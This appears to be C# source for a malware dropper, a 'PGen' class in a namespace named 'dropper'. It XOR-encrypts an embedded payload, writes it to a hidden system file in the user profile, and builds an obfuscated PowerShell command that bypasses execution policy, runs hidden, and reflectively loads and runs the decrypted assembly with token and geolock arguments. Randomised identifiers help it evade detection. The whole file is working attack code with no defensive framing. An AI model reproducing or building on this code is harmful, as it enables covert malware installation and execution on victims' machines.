using System;
using System.IO;
using System.Linq;
using System.Text;

namespace dropper
{
    public class PGen
    {
        public static string GenerateCommand(string token, string prefix, string geolock, Random rng)
        {
            string xorkey = RandomString(20, rng);
            byte[] encrypted = XORCrypt(Convert.FromBase64String(Resource1.payload_data), xorkey);
            string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
            File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp", FileAttributes.System | FileAttributes.Hidden);
            File.WriteAllBytes(temppath, encrypted);

            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } }"));
            return $"powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname}([System.IO.File]::ReadAllBytes('{temppath}'), '{xorkey}')).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
        }

        private static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }

        private static byte[] XORCrypt(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
            }
            return input;
        }
    }
}
